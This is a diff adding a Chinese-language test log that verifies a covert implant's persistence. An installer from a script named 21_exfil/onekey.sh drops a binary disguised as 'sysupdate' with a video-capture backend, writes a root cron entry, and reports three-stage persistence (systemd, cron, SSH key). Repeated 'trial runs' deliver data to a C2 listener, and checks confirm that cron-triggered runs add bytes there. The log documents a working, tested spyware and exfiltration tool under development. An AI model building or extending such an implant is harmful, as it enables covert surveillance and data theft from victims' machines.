@@ -1,0 +1,66 @@
+=== R3 cron 条目真的会被执行（可重生成）===
+
+[OK] S0a 真 cron（cronie）构建成功  CROND=/var/tmp/cronsrc/crond
+[OK] S0b 版本可查  cronie 1.7.2
+[OK] S1a 一键脚本已生成  1977708 字节
+[OK] S0c crond 以守护进程方式存活  pid=7601
+[OK] S2a C2 收端已起  port=34805
+    ---- install 输出（第 1 次） ----
+    [OK] 环境: arch=x86_64 systemd=0 backend=v4l2 front=无
+    [OK] 内嵌产物校验通过（ELF/amd64，e_machine=62，1421408 字节）
+    [OK] 配置写入 /etc/sysupdate/sysupdate.conf（0600）
+    [OK] 二进制已安装 /usr/local/bin/sysupdate
+    [OK] 启动器已写入 /var/lib/sysupdate/run.sh（0700）
+    [OK] systemd 单元静态校验通过
+    [WARN] systemd 未运行，单元已校验但未安装（降级到 cron）
+    [OK] cron 条目已写入 /etc/cron.d/sysupdate（分位 58）
+    [OK] cron 守护进程在跑（条目会被执行）
+    [OK] 试运行已送达 C2（204288 字节信元，tcp://127.0.0.1:34805）
+    [INFO] 驻留三段: systemd=1 cron=1 sshkey=0（生效 2/3）
+    [WARN] 驻留仅 2/3 段生效——报告成功不等于三段都在，逐段核对见 status
+    计数: 成功 9  失败 0  警告 2
+    ---- 条目分位 M=58，距下次触发 3362 秒 ----
+    ---- install 输出（第 2 次） ----
+    [OK] 环境: arch=x86_64 systemd=0 backend=v4l2 front=无
+    [OK] 内嵌产物校验通过（ELF/amd64，e_machine=62，1421408 字节）
+    [OK] 配置写入 /etc/sysupdate/sysupdate.conf（0600）
+    [OK] 二进制已安装 /usr/local/bin/sysupdate
+    [OK] 启动器已写入 /var/lib/sysupdate/run.sh（0700）
+    [OK] systemd 单元静态校验通过
+    [WARN] systemd 未运行，单元已校验但未安装（降级到 cron）
+    [OK] cron 条目已写入 /etc/cron.d/sysupdate（分位 2）
+    [OK] cron 守护进程在跑（条目会被执行）
+    [OK] 试运行已送达 C2（204288 字节信元，tcp://127.0.0.1:34805）
+    [INFO] 驻留三段: systemd=1 cron=1 sshkey=0（生效 2/3）
+    [WARN] 驻留仅 2/3 段生效——报告成功不等于三段都在，逐段核对见 status
+    计数: 成功 9  失败 0  警告 2
+    ---- 条目分位 M=2，距下次触发 3598 秒 ----
+    ---- install 输出（第 3 次） ----
+    [OK] 环境: arch=x86_64 systemd=0 backend=v4l2 front=无
+    [OK] 内嵌产物校验通过（ELF/amd64，e_machine=62，1421408 字节）
+    [OK] 配置写入 /etc/sysupdate/sysupdate.conf（0600）
+    [OK] 二进制已安装 /usr/local/bin/sysupdate
+    [OK] 启动器已写入 /var/lib/sysupdate/run.sh（0700）
+    [OK] systemd 单元静态校验通过
+    [WARN] systemd 未运行，单元已校验但未安装（降级到 cron）
+    [OK] cron 条目已写入 /etc/cron.d/sysupdate（分位 3）
+    [OK] cron 守护进程在跑（条目会被执行）
+    [OK] 试运行已送达 C2（204288 字节信元，tcp://127.0.0.1:34805）
+    [INFO] 驻留三段: systemd=1 cron=1 sshkey=0（生效 2/3）
+    [WARN] 驻留仅 2/3 段生效——报告成功不等于三段都在，逐段核对见 status
+    计数: 成功 9  失败 0  警告 2
+    ---- 条目分位 M=3，距下次触发 57 秒 ----
+[OK] S1c install 退出 0  rc=0
+[OK] S1d 条目含 user 字段与 run.sh  # managed | SHELL=/bin/sh | PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin | 3 * * * * root /var/lib/sysupdate/run.sh --batches 1
+    ---- 触发前 C2 基线 612864 字节（install 试运行已计入） ----
+[OK] S2 真实分钟触发后 C2 新增字节  612864 -> 817152（+204288）连接数=4
+[OK] S3 crond 日志记录了该命令  log_it: (root 7862) CMD (/var/lib/sysupdate/run.sh --batches 1)
+    ---- 反向注入：去掉 user 字段（真 cron.d 契约违反） ----
+[OK] R1 缺陷条目：C2 不再新增字节  817152 -> 817152
+[OK] R2 缺陷条目：crond 日志不再出现该命令  无
+[OK] C1 卸载后真根无残留  无
+
+计数: PASS 12  FAIL 0
+SRC 21_exfil/onekey.sh ba8092b4235273770a0362373880451c3a3d707e87e08a77e1e19c7811853ca8 57547
+SRC redline/verify_r3_cron.py 5cdacd18d0d6598c63866a1bca47be7eb9d6de979b630a1ebc71d2258566786d 12842
+SRC scripts/build_cronie.sh b8ce662bfb1f52336b178de1f7fe46880c9dae5dd0c6acea5992e5224b20dc72 3877
